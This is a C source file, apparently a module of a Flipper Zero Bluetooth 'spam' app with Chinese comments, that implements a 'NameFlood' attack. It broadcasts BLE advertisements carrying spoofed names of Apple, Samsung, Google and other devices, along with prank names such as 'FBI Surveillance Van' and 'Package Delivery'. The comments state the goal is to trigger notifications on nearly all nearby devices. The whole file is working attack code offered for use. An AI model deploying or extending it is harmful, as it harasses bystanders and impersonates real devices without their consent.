#include "ble_spam.h"
#include <furi_hal_random.h>
#include <string.h>

// =============================================================================
// NameFlood 協議 - 設備名稱洪水
// =============================================================================
// NameFlood 通過發送攜帶各種設備名稱的 BLE 廣播來觸發通知
// 幾乎所有 BLE 設備掃描都會嘗試解析設備名稱
// 因此這個協議可以觸發幾乎所有附近設備的通知
//
// 策略:
// 1. 使用常見的設備名稱前綴
// 2. 輪換不同的設備類型
// 3. 模擬真實設備的命名模式
// =============================================================================

// =============================================================================
// NameFlood 設備名稱列表
// =============================================================================
static const char* g_nameflood_devices[] = {
    // Apple 設備
    "iPhone 15 Pro Max",
    "iPhone 15 Pro",
    "iPhone 15",
    "iPhone 14 Pro Max",
    "iPhone 14 Pro",
    "iPhone 14",
    "iPhone 13 Pro",
    "iPhone 13",
    "iPhone 12 Pro Max",
    "iPad Pro 12.9\"",
    "iPad Pro 11\"",
    "iPad Air",
    "iPad mini",
    "MacBook Pro 16\"",
    "MacBook Air",
    "MacBook Pro 14\"",
    "iMac 24\"",
    "Mac Studio",
    "Mac Mini",
    "Apple Watch Ultra",
    "Apple Watch Series 9",
    "Apple Watch Series 8",
    "Apple Watch SE",
    "AirPods Pro",
    "AirPods 3rd Gen",
    "AirPods 2nd Gen",
    "AirPods Max",
    "AirPods",
    "HomePod mini",
    "HomePod",
    "Apple TV 4K",
    "Apple TV HD",
    "AirTag",
    "Apple Vision Pro",
    
    // Samsung 設備
    "Galaxy S24 Ultra",
    "Galaxy S24+",
    "Galaxy S24",
    "Galaxy S23 Ultra",
    "Galaxy S23+",
    "Galaxy S23",
    "Galaxy Z Fold5",
    "Galaxy Z Flip5",
    "Galaxy Watch6 Classic",
    "Galaxy Watch6",
    "Galaxy Watch5 Pro",
    "Galaxy Watch5",
    "Galaxy Buds2 Pro",
    "Galaxy Buds2",
    "Galaxy Buds Pro",
    "Galaxy Buds Live",
    "Galaxy Tab S9 Ultra",
    "Galaxy Tab S9+",
    "Galaxy Tab S9",
    
    // Google Pixel 設備
    "Pixel 8 Pro",
    "Pixel 8",
    "Pixel 7 Pro",
    "Pixel 7",
    "Pixel 7a",
    "Pixel 6 Pro",
    "Pixel 6",
    "Pixel 6a",
    "Pixel Buds Pro",
    "Pixel Buds A-Series",
    "Pixel Buds",
    "Pixel Watch",
    "Pixel Tablet",
    
    // OPPO / Realme / OnePlus 設備
    "OPPO Find X7 Pro",
    "OPPO Find X6 Pro",
    "OPPO Find N3",
    "OPPO Find N2 Flip",
    "OPPO Reno 10 Pro+",
    "OPPO Reno 10",
    "OPPO Pad 2",
    "OPPO Enco X3",
    "OPPO Enco Air3 Pro",
    "OPPO Enco Free2",
    "realme GT5 Pro",
    "realme GT5",
    "realme 11 Pro+",
    "realme 11 Pro",
    "realme Buds Air 5 Pro",
    "realme Buds Air 3S",
    "realme Buds T100",
    "OnePlus 12",
    "OnePlus 11",
    "OnePlus Open",
    "OnePlus Buds Pro 2",
    "OnePlus Buds Z2",
    
    // Xiaomi / Redmi / POCO 設備
    "Xiaomi 14 Ultra",
    "Xiaomi 14 Pro",
    "Xiaomi 14",
    "Xiaomi 13 Ultra",
    "Xiaomi 13 Pro",
    "Xiaomi 13",
    "Xiaomi 12 Pro",
    "Xiaomi 12",
    "Redmi K60 Pro",
    "Redmi K60",
    "Redmi Note 13 Pro+",
    "Redmi Note 13 Pro",
    "Redmi Note 13",
    "POCO F5 Pro",
    "POCO F5",
    "POCO X5 Pro",
    "Xiaomi Buds 4 Pro",
    "Xiaomi Buds 4",
    "Redmi Buds 4 Pro",
    "Redmi Buds 4 Lite",
    "POCO Pods",
    "Xiaomi Pad 6",
    "Xiaomi Pad 5 Pro",
    "Xiaomi Pad 5",
    "Xiaomi Watch 2",
    "Xiaomi Watch S1",
    "Xiaomi Band 8",
    
    // Vivo / iQOO 設備
    "Vivo X100 Pro",
    "Vivo X100",
    "Vivo X90 Pro+",
    "Vivo X90 Pro",
    "Vivo X90",
    "Vivo X Fold 3 Pro",
    "Vivo X Fold 3",
    "Vivo X Flip",
    "Vivo Pad 2",
    "Vivo Pad",
    "Vivo TWS 3 Pro",
    "Vivo TWS 3",
    "Vivo TWS 2",
    "iQOO 12 Pro",
    "iQOO 12",
    "iQOO 11 Pro",
    "iQOO 11",
    "iQOO Pad",
    
    // Sony 設備
    "Sony WH-1000XM5",
    "Sony WH-1000XM4",
    "Sony WH-1000XM3",
    "Sony WF-1000XM5",
    "Sony WF-1000XM4",
    "Sony WF-1000XM3",
    "Sony WF-C700N",
    "Sony WF-LS900N",
    "Sony LinkBuds S",
    "Sony LinkBuds",
    "Sony SRS-XB43",
    "Sony SRS-XB33",
    "Sony SRS-XB13",
    
    // JBL 設備
    "JBL Tour One M2",
    "JBL Tour Pro 2",
    "JBL LIVE 770NC",
    "JBL LIVE 670NC",
    "JBL LIVE 660NC",
    "JBL LIVE 400BT",
    "JBL TUNE 770NC",
    "JBL TUNE 660NC",
    "JBL TUNE 510BT",
    "JBL Reflector Pro",
    "JBL Endurance Peak 3",
    "JBL Wave Beam",
    "JBL Wave Flex",
    "JBL Flip 6",
    "JBL Flip 5",
    "JBL Charge 5",
    "JBL Pulse 5",
    "JBL Pulse 4",
    "JBL PartyBox 110",
    "JBL PartyBox 310",
    
    // Anker / soundcore 設備
    "soundcore Liberty 4 NC",
    "soundcore Liberty 4",
    "soundcore Liberty 3 Pro",
    "soundcore Liberty Air 2 Pro",
    "soundcore Liberty Air 2",
    "soundcore Liberty Air 2 Neo",
    "soundcore Liberty Neo",
    "soundcore Space One",
    "soundcore Space Q45",
    "soundcore Motion+",
    "soundcore Motion X500",
    "soundcore Glow Mini",
    "soundcore Glow",
    "Anker PowerCore",
    
    // 其他音頻品牌
    "Bose QuietComfort Ultra",
    "Bose QuietComfort 45",
    "Bose QuietComfort 35 II",
    "Bose NC 700",
    "Bose SoundLink Flex",
    "Bose SoundLink Mini II",
    "Bose Sport Earbuds",
    "Bose QuietComfort Earbuds II",
    "Beats Studio Pro",
    "Beats Studio3 Wireless",
    "Beats Fit Pro",
    "Beats Flex",
    "Beats Powerbeats Pro",
    "Beats Powerbeats 3",
    "Beats Solo Pro",
    "Beats Solo 3 Wireless",
    "Beats Studio Buds+",
    "Beats Studio Buds",
    "Beats Powerbeats",
    
    // 遊戲設備
    "Razer BlackShark V2 Pro",
    "Razer BlackShark V2",
    "Razer Hammerhead TWS X",
    "Razer Hammerhead TWS",
    "Razer Kishi V2",
    "SteelSeries Arctis Nova Pro",
    "SteelSeries Arctis Nova 7",
    "SteelSeries Arctis 9",
    "SteelSeries Arctis 7+",
    "HyperX Cloud Alpha",
    "HyperX Cloud II Wireless",
    "HyperX Cloud Stinger 2",
    "Logitech G Pro X",
    "Logitech G Pro X Superlight 2",
    "Logitech G Pro Wireless",
    "Logitech G502 X Plus",
    "Logitech G733",
    "Logitech G535",
    "Logitech MX Master 3S",
    "Logitech MX Keys S",
    "Logitech MX Keys",
    "Logitech MX Mechanical",
    
    // 智能家居
    "Nest Hub Max",
    "Nest Hub",
    "Nest Audio",
    "Nest Mini",
    "Nest Thermostat",
    "Nest Doorbell",
    "Nest Cam",
    "Amazon Echo Pop",
    "Amazon Echo Dot",
    "Amazon Echo Show 5",
    "Amazon Echo Show 8",
    "Amazon Echo Show 10",
    "Amazon Echo Studio",
    "Amazon Echo Buds",
    "Amazon Echo Buds 2",
    "Apple HomePod",
    "Apple HomePod mini",
    "Sonos One",
    "Sonos Era 300",
    "Sonos Era 100",
    "Sonos Move",
    "Sonos Roam",
    
    // 惡作劇/趣味名稱
    "Free Robux",
    "Free VBucks",
    "Rickroll",
    "FBI Surveillance Van",
    "Tesla Model S",
    "NSA Van #317",
    "Your WiFi Password",
    "Click Here For Free WiFi",
    "Granny's iPhone",
    "Hacker's Laptop",
    "Police Speed Camera",
    "Speed Camera Ahead",
    "COVID-19 Tracker",
    "Vaccine Appointment",
    "Package Delivery",
    "Amazon Package",
    "FedEx Package",
    "UPS Package",
    "DHL Package",
};

// =============================================================================
// NameFlood 構建
// =============================================================================
static uint8_t nameflood_build_packet(uint8_t* _size, uint8_t** _packet, AttackConfig* config) {
    NamefloodCfg* cfg = &config->config.nameflood;
    
    // 選擇設備名稱
    const char* device_name;
    if(config->mode == AttackMode_Random || config->mode == AttackMode_Single) {
        uint32_t idx = rand() % (sizeof(g_nameflood_devices) / sizeof(g_nameflood_devices[0]));
        device_name = g_nameflood_devices[idx];
    } else {
        device_name = cfg->name;
    }
    
    size_t name_len = strlen(device_name);
    
    // 構建數據包
    // 格式: Flags + Device Name
    uint8_t total_size = 3 + 1 + 1 + name_len;  // Flags + Length + Type + Name
    uint8_t* packet = malloc(total_size);
    uint8_t i = 0;
    
    // Flags
    packet[i++] = 0x02;  // Length
    packet[i++] = 0x01;  // AD Type: Flags
    packet[i++] = 0x06;  // Flags (General Discoverable + BR/EDR + LE)
    
    // Device Name
    packet[i++] = 1 + name_len;  // Length
    packet[i++] = 0x09;           // AD Type: Complete Local Name
    memcpy(&packet[i], device_name, name_len);
    i += name_len;
    
    *_size = i;
    *_packet = packet;
    return i;
}

// =============================================================================
// 獲取設備名稱
// =============================================================================
static const char* nameflood_get_name(uint32_t index) {
    if(index >= sizeof(g_nameflood_devices) / sizeof(g_nameflood_devices[0])) {
        return "Unknown";
    }
    return g_nameflood_devices[index];
}

static uint32_t nameflood_get_count(void) {
    return sizeof(g_nameflood_devices) / sizeof(g_nameflood_devices[0]);
}

// =============================================================================
// 協議驅動
// =============================================================================
const ProtocolDriver g_protocol_nameflood = {
    .name = "NameFlood",
    .short_name = "Name",
    .is_active = true,
    .build_packet = nameflood_build_packet,
    .get_device_name = nameflood_get_name,
    .get_device_count = nameflood_get_count,
    .init = NULL,
    .deinit = NULL,
};